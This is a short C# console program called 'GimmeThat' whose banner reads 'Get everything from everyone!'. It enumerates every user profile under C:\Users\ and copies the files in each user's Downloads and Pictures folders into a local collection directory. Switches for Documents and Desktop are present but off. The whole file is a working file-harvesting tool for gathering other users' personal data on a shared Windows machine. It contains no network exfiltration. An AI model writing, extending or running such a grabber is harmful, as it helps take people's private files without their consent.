using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;

namespace GimmeThat
{
    class Program
    {
        static void Main(string[] args)
        {
            banner();
            bool download = true;
            bool pictures = true;
            bool documents = false;
            bool desktop = false;

            checkFolder();

            Console.WriteLine("[+] Found users directories: ");
            foreach(string folder in getDirectories())
            {
                Console.WriteLine(folder);
            }

            if(download)
                copyFolder("downloads", getDirectories());

            if(pictures)
                copyFolder("pictures", getDirectories());

            if (documents)
                copyFolder("documents", getDirectories());

            if (desktop)
                copyFolder("desktop", getDirectories());
            Console.ReadLine();
        }
        public static void banner()
        {
            Console.WriteLine("   _____ _                       _______ _           _   ");
            Console.WriteLine("  / ____(_)                     |__   __| |         | |  ");
            Console.WriteLine(" | |  __ _ _ __ ___  _ __ ___   ___| |  | |__   __ _| |_ ");
            Console.WriteLine(@" | | |_ | | '_ ` _ \| '_ ` _ \ / _ \ |  | '_ \ / _` | __|");
            Console.WriteLine(" | |__| | | | | | | | | | | | |  __/ |  | | | | (_| | |_ ");
            Console.WriteLine(@"  \_____|_|_| |_| |_|_| |_| |_|\___|_|  |_| |_|\__,_|\__|");
            Console.WriteLine("\n               Get everything from everyone! \n");

        }
        private static void checkFolder()
        {
            if (!Directory.Exists("files"))
                Directory.CreateDirectory("files");
        }
        public static string[] getDirectories()
        {
            string path = @"C:\Users\";
            string[] files = Directory.GetDirectories(path);
            return files;
        }
        public static void copyFolder(string path, string[] users)
        {
            foreach(string i in users)
            {
                string destinyPath = Directory.GetCurrentDirectory()+@"\files\" + path + "_" + i.Replace(@"\", "").Replace(@":", "");
                Directory.CreateDirectory(destinyPath);
                try
                {
                    //copy only files here
                    string folder = i + @"\"+path;
                    string[] files = Directory.GetFiles(folder);
                    foreach (string item in files)
                    {
                        Console.WriteLine(item);
                        File.Copy(item, destinyPath+"\\"+Path.GetFileName(item), true);
                    }
                }
                catch(Exception ex)
                {
                    Console.WriteLine(ex.ToString());
                }
            }
        }
    }
}
